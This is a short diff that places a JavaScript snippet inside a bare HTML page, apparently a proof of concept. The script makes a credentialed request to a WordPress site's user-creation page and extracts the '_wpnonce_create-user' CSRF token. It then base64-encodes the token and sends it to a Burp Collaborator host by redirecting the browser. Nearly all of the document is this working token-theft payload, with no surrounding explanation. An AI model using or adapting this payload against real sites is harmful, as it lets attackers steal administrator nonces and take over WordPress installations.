@@ -1,4 +1,14 @@
-var target="http://localhost/arash"
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <script>
+ var target="http://localhost/arash"
 var a = new XMLHttpRequest();
     a.open("GET", `${target}/wp-admin/user-new.php`, true);
     a.withCredentials = true;
@@ -11,4 +21,6 @@ var a = new XMLHttpRequest();
       const token_key = htmlDocument.getElementsByName("_wpnonce_create-user")[0].value;
       window.location = 'http://zqtsznaun6v7j03sw2fse8fvsmycm1.burpcollaborator.net/?data=' + btoa(token_key);
     }
-    
+  </script>
+</body>
+</html>
